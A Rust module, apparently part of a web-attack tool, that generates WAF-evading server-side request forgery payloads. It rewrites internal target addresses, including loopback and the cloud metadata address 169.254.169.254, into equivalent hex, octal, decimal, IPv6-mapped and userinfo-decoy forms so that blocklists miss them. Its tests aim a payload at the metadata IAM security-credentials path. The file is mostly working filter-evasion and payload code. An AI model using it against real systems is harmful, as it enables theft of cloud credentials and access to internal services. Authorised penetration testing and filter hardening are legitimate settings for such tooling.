//! SSRF payload-string equivalence + the joint `(payload × delivery)`
//! generator — the SSRF arm of Phase B.
//!
//! The sound equivalence is **address-literal equivalence**: the host a
//! URL parser hands to `connect()` is computed by `inet_aton`-style
//! parsing (glibc/libc/Python `socket`/many HTTP clients), under which
//! `127.0.0.1` ≡ `0x7f000001` ≡ `2130706433` ≡ `0177.0.0.1` ≡ `127.1`
//! ≡ `[::ffff:127.0.0.1]` — every form resolves to the SAME 32-bit
//! address the server actually connects to, while a WAF blocklist
//! keyed on the dotted-quad / `localhost` / `169.254.169.254` literal
//! matches none of them. Userinfo (`http://trusted@169.254.169.254/`)
//! and scheme case are RFC 3986 transparent to the connect host too.
//!
//! Anti-rig: the operator's *target* (the canonical connect IP + the
//! path/marker) is preserved verbatim and re-verified
//! ([`still_targets`]). A rewrite that changed `169.254.169.254` to
//! `8.8.8.8`, or dropped the metadata path, is rejected — the
//! equivalence holds only for address forms that provably canonicalise
//! to the original, never "any host looks fine". Enclosed-alphanumeric
//! / fullwidth host glyphs are NOT emitted (no resolver decodes them —
//! that would be an unsound non-attack).

use super::{DeliveryShape, Dialect, EquivConfig, EquivPayload, Rng};

/// Loopback / link-local aliases that DNS or the stub resolver maps to
/// a fixed address (RFC 6761 `localhost`; the documented wildcard-DNS
/// services that statically answer with the embedded IP).
const HOST_ALIASES: &[(&str, u32)] = &[
    ("localhost", 0x7f00_0001),
    ("ip6-localhost", 0x7f00_0001),
    ("localtest.me", 0x7f00_0001),
    ("localhost.localdomain", 0x7f00_0001),
];

/// `inet_aton`-style parse of a host literal to its 32-bit IPv4 value.
/// Accepts 1–4 dotted parts, each decimal / `0x`-hex / `0`-octal, with
/// the trailing part absorbing the remaining bytes (`127.1` →
/// `127.0.0.1`). Mirrors what libc / Python `socket` / many HTTP
/// clients feed to `connect()`. Also folds IPv6 loopback and
/// `::ffff:V4` to the embedded V4, plus the static aliases above.
fn inet_aton(host: &str) -> Option<u32> {
    let h = host.trim().trim_end_matches('.').to_ascii_lowercase();
    if h.is_empty() {
        return None;
    }
    if let Some((_, v)) = HOST_ALIASES.iter().find(|(n, _)| *n == h) {
        return Some(*v);
    }
    // IPv6 forms we can fold to a V4 connect target.
    if h == "[::1]" || h == "::1" || h == "[0:0:0:0:0:0:0:1]" {
        return Some(0x7f00_0001);
    }
    if let Some(rest) = h
        .trim_start_matches('[')
        .trim_end_matches(']')
        .strip_prefix("::ffff:")
    {
        return inet_aton(rest);
    }
    let parse_part = |p: &str| -> Option<u64> {
        if let Some(x) = p.strip_prefix("0x") {
            u64::from_str_radix(x, 16).ok()
        } else if p.len() > 1 && p.starts_with('0') {
            u64::from_str_radix(&p[1..], 8).ok()
        } else {
            p.parse::<u64>().ok()
        }
    };
    let parts: Vec<&str> = h.split('.').collect();
    if parts.is_empty() || parts.len() > 4 || parts.iter().any(|p| p.is_empty()) {
        return None;
    }
    let nums: Vec<u64> = parts.iter().map(|p| parse_part(p)).collect::<Option<_>>()?;
    let n = nums.len();
    // Leading parts must be single bytes; the final part absorbs the
    // remaining width (classic inet_aton).
    let mut val: u64 = 0;
    for (i, &x) in nums.iter().enumerate() {
        if i + 1 < n {
            if x > 0xff {
                return None;
            }
            val |= x << (8 * (3 - i));
        } else {
            // final part absorbs the remaining bytes (classic inet_aton)
            let width_bits = 8 * (4 - i) as u32;
            let cap = if width_bits >= 64 {
                u64::MAX
            } else {
                (1u64 << width_bits) - 1
            };
            if x > cap {
                return None;
            }
            val |= x;
        }
    }
    u32::try_from(val).ok()
}

fn ipv4_dotted(v: u32) -> String {
    format!(
        "{}.{}.{}.{}",
        (v >> 24) & 0xff,
        (v >> 16) & 0xff,
        (v >> 8) & 0xff,
        v & 0xff
    )
}

/// Is this 32-bit address an SSRF-relevant internal target (loopback,
/// link-local incl. cloud metadata `169.254.169.254`, private RFC1918,
/// or `0.0.0.0/8`)? Used to keep the *mechanism* present (anti-rig:
/// don't accept a rewrite that escaped to a public host).
fn is_internal(v: u32) -> bool {
    let o = [
        (v >> 24) & 0xff,
        (v >> 16) & 0xff,
        (v >> 8) & 0xff,
        v & 0xff,
    ];
    o[0] == 127
        || o[0] == 0
        || o[0] == 10
        || (o[0] == 172 && (16..=31).contains(&o[1]))
        || (o[0] == 192 && o[1] == 168)
        || (o[0] == 169 && o[1] == 254)
        || (o[0] == 100 && (64..=127).contains(&o[1]))
}

/// Split a payload into (scheme, userinfo?, host, port?, path+rest).
/// Tolerant: works on a bare `host/path` too.
struct Url {
    scheme: String,
    host: String,
    rest: String, // port + path + query, verbatim
}

fn split_url(s: &str) -> Option<Url> {
    let (scheme, after) = match s.find("://") {
        Some(i) => (s[..i].to_string(), &s[i + 3..]),
        None => (String::new(), s),
    };
    // strip userinfo (everything up to and including the last '@'
    // before the first '/').
    let authority_end = after.find(['/', '?', '#']).unwrap_or(after.len());
    let (authority, rest) = after.split_at(authority_end);
    let host_part = match authority.rfind('@') {
        Some(a) => &authority[a + 1..],
        None => authority,
    };
    // separate :port
    let (host, port) = if host_part.starts_with('[') {
        match host_part.find(']') {
            Some(b) => (host_part[..=b].to_string(), host_part[b + 1..].to_string()),
            None => (host_part.to_string(), String::new()),
        }
    } else if let Some(c) = host_part.rfind(':') {
        (host_part[..c].to_string(), host_part[c..].to_string())
    } else {
        (host_part.to_string(), String::new())
    };
    if host.is_empty() {
        return None;
    }
    Some(Url {
        scheme: scheme.to_ascii_lowercase(),
        host,
        rest: format!("{port}{rest}"),
    })
}

/// Canonical connect-target view: `<canonical-ipv4>|<lowercased rest>`.
/// All sound equivalences fold here, so [`still_targets`] is a
/// consistent relation.
#[must_use]
pub fn normalize(s: &str) -> String {
    match split_url(s) {
        Some(u) => match inet_aton(&u.host) {
            Some(v) => format!("{}|{}", ipv4_dotted(v), u.rest.to_ascii_lowercase()),
            None => format!(
                "{}|{}",
                u.host.trim_matches(['[', ']']).to_ascii_lowercase(),
                u.rest.to_ascii_lowercase()
            ),
        },
        None => s.to_ascii_lowercase(),
    }
}

/// Looks like an SSRF attempt: a URL/host whose connect target is an
/// internal address (loopback / link-local / RFC1918 / `0.0.0.0/8`).
fn is_ssrf(s: &str) -> bool {
    split_url(s)
        .and_then(|u| inet_aton(&u.host))
        .is_some_and(is_internal)
}

/// True iff `cand` still targets the operator's exact internal host
/// (same canonical IPv4) and still carries the same path/marker.
#[must_use]
pub fn still_targets(original: &str, cand: &str) -> bool {
    if cand.trim().is_empty() || !is_ssrf(original) {
        return false;
    }
    let (Some(uo), Some(uc)) = (split_url(original), split_url(cand)) else {
        return false;
    };
    let (Some(vo), Some(vc)) = (inet_aton(&uo.host), inet_aton(&uc.host)) else {
        return false;
    };
    // exact same connect target (anti-rig: never a different host) and
    // still internal (mechanism preserved).
    vo == vc && is_internal(vc) && uo.rest.eq_ignore_ascii_case(&uc.rest)
}

// ── rewrites (resolver-transparent, WAF-opaque) ────────────────────

/// Re-encode the host as one of its `inet_aton`-equivalent literals.
fn rw_ip_form(v: u32, rng: &mut Rng) -> String {
    let o = [
        (v >> 24) & 0xff,
        (v >> 16) & 0xff,
        (v >> 8) & 0xff,
        v & 0xff,
    ];
    match rng.below(8) {
        0 => format!("{v}"),       // 32-bit decimal
        1 => format!("0x{v:08x}"), // 32-bit hex
        2 => format!("0x{:x}.0x{:x}.0x{:x}.0x{:x}", o[0], o[1], o[2], o[3]),
        3 => format!("0{:o}.0{:o}.0{:o}.0{:o}", o[0], o[1], o[2], o[3]),
        4 => format!("{}.{}", o[0], (o[1] << 16) | (o[2] << 8) | o[3]), // a.b(24)
        5 => format!("{}.{}.{}", o[0], o[1], (o[2] << 8) | o[3]),       // a.b.c(16)
        6 => format!("[::ffff:{}.{}.{}.{}]", o[0], o[1], o[2], o[3]),   // v4-mapped v6
        _ => format!("0x{:x}.{}.{}.{}", o[0], o[1], o[2], o[3]),        // mixed
    }
}

/// RFC 3986 userinfo: `scheme://<decoy>@<host><rest>` — the parser
/// connects to `<host>`; a WAF that allowlists `<decoy>` is fooled.
fn rw_userinfo(u: &Url, host: &str, rng: &mut Rng) -> String {
    let decoy = *rng.pick(&[
        "trusted.example.com",
        "api.internal",
        "www.google.com",
        "allowed",
    ]);
    let scheme = if u.scheme.is_empty() {
        "http".into()
    } else {
        u.scheme.clone()
    };
    format!("{scheme}://{decoy}@{host}{}", u.rest)
}

fn rw_scheme_case(u: &Url, host: &str, rng: &mut Rng) -> String {
    let sc = if u.scheme.is_empty() {
        "http"
    } else {
        &u.scheme
    };
    let cased: String = sc
        .chars()
        .map(|c| {
            if rng.chance(1, 2) {
                c.to_ascii_uppercase()
            } else {
                c
            }
        })
        .collect();
    format!("{cased}://{host}{}", u.rest)
}

#[must_use]
pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    let mut rng = Rng::new(cfg.seed);
    let all = super::sql::delivery_set(&cfg.param);
    let (deliveries, single_forced) = match cfg.force_delivery {
        Some(i) if i < all.len() => (vec![all[i].clone()], true),
        _ => (all, false),
    };
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut out: Vec<EquivPayload> = Vec::with_capacity(cfg.max);

    if !still_targets(payload, payload) {
        return out;
    }
    // Invariant: still_targets(payload, payload) returned true, which
    // internally calls split_url + inet_aton on the same payload and
    // returns false when either is None — so both succeed here.
    let base = split_url(payload)
        .expect("invariant: still_targets() confirmed split_url succeeds");
    let v = inet_aton(&base.host)
        .expect("invariant: still_targets() confirmed inet_aton succeeds");

    for d in &deliveries {
        if !cfg.vary_delivery && !single_forced && !matches!(d, DeliveryShape::Query { .. }) {
            continue;
        }
        let key = format!("{}\u{1}{}", payload, d.label());
        if seen.insert(key) {
            out.push(EquivPayload {
                payload: payload.to_string(),
                delivery: d.clone(),
                dialect: Dialect::Generic,
                rules: vec!["identity"],
            });
        }
    }

    let mut attempts = 0;
    while out.len() < cfg.max && attempts < cfg.max * super::ATTEMPT_BUDGET_MULTIPLIER + super::ATTEMPT_BUDGET_FLOOR {
        attempts += 1;
        let mut host = base.host.clone();
        let mut s;
        let mut rules: Vec<&'static str> = Vec::with_capacity(8);
        // host address-literal equivalence (the core moat)
        if rng.chance(4, 5) {
            host = rw_ip_form(v, &mut rng);
            rules.push("inet_aton_form");
        }
        // assemble with scheme/userinfo variation
        let scheme = if base.scheme.is_empty() {
            "http".to_string()
        } else {
            base.scheme.clone()
        };
        s = format!("{scheme}://{host}{}", base.rest);
        if rng.chance(2, 5) {
            s = rw_userinfo(&base, &host, &mut rng);
            rules.push("rfc3986_userinfo");
        } else if rng.chance(1, 2) {
            s = rw_scheme_case(&base, &host, &mut rng);
            rules.push("scheme_case");
        }
        if rules.is_empty() {
            continue;
        }
        if !still_targets(payload, &s) {
            continue;
        }
        let d = if cfg.vary_delivery || single_forced {
            rng.pick(&deliveries).clone()
        } else {
            DeliveryShape::Query {
                param: cfg.param.clone(),
            }
        };
        let key = format!("{s}\u{1}{}", d.label());
        if !seen.insert(key) {
            continue;
        }
        out.push(EquivPayload {
            payload: s,
            delivery: d,
            dialect: Dialect::Generic,
            rules,
        });
    }
    super::enforce_transport_legal(&mut out);
    out.truncate(cfg.max);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(seed: u64) -> EquivConfig {
        crate::grammar::equiv::test_cfg(seed, 48, "url")
    }

    #[test]
    fn inet_aton_forms_all_canonicalise_identically() {
        let want = 0x7f00_0001;
        for f in [
            "127.0.0.1",
            "0x7f000001",
            "2130706433",
            "0177.0.0.1",
            "127.1",
            "127.0.1",
            "0x7f.0.0.1",
            "[::ffff:127.0.0.1]",
            "localhost",
        ] {
            assert_eq!(inet_aton(f), Some(want), "form {f:?} mismatched");
        }
        // metadata IP equivalents
        let md = 0xa9fe_a9fe;
        for f in [
            "169.254.169.254",
            "0xa9fea9fe",
            "2852039166",
            "169.254.43518",
        ] {
            assert_eq!(inet_aton(f), Some(md), "metadata form {f:?}");
        }
    }

    #[test]
    fn target_and_metadata_path_preserved_never_swapped() {
        let atk = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
        let v = generate(atk, &cfg(3));
        assert!(!v.is_empty());
        for m in &v {
            assert!(still_targets(atk, &m.payload), "unsound {:?}", m.payload);
            let n = normalize(&m.payload);
            assert!(
                n.starts_with("169.254.169.254|"),
                "connect target changed: {:?} -> {n}",
                m.payload
            );
            assert!(
                n.contains("/latest/meta-data/iam/security-credentials/"),
                "metadata path lost: {:?}",
                m.payload
            );
            assert!(
                !n.contains("8.8.8.8"),
                "escaped to public host: {:?}",
                m.payload
            );
        }
    }

    #[test]
    fn wrong_host_substitution_is_rejected() {
        // 8.8.8.8 is public — a rewrite to it is NOT equivalent.
        assert!(!still_targets("http://127.0.0.1/x", "http://8.8.8.8/x"));
        // different internal host is still a different target.
        assert!(!still_targets(
            "http://169.254.169.254/a",
            "http://127.0.0.1/a"
        ));
        // path/marker must survive.
        assert!(!still_targets(
            "http://127.0.0.1/admin",
            "http://127.0.0.1/public"
        ));
        // userinfo decoy must not be mistaken for the host.
        assert!(still_targets(
            "http://127.0.0.1/x",
            "http://google.com@0x7f000001/x"
        ));
    }

    #[test]
    fn non_ssrf_and_empty_emit_nothing() {
        assert!(generate("", &cfg(1)).is_empty());
        assert!(generate("hello world", &cfg(1)).is_empty());
        assert!(generate("http://example.com/", &cfg(1)).is_empty()); // public host
    }

    #[test]
    fn deterministic_and_diverse() {
        let a: Vec<_> = generate("http://127.0.0.1/admin", &cfg(9))
            .into_iter()
            .map(|m| m.payload)
            .collect();
        let b: Vec<_> = generate("http://127.0.0.1/admin", &cfg(9))
            .into_iter()
            .map(|m| m.payload)
            .collect();
        assert_eq!(a, b);
        assert!(a.iter().collect::<std::collections::HashSet<_>>().len() >= 6);
    }

    #[test]
    fn every_member_verifies_and_classes_appear() {
        let atk = "http://127.0.0.1:8080/admin";
        let mut seen_rules = std::collections::HashSet::new();
        for seed in 0..40u64 {
            for m in generate(atk, &cfg(seed)) {
                assert!(still_targets(atk, &m.payload), "UNSOUND {:?}", m.payload);
                for r in &m.rules {
                    seen_rules.insert(*r);
                }
            }
        }
        for need in ["inet_aton_form", "rfc3986_userinfo", "scheme_case"] {
            assert!(seen_rules.contains(need), "rule {need:?} never produced");
        }
    }
}
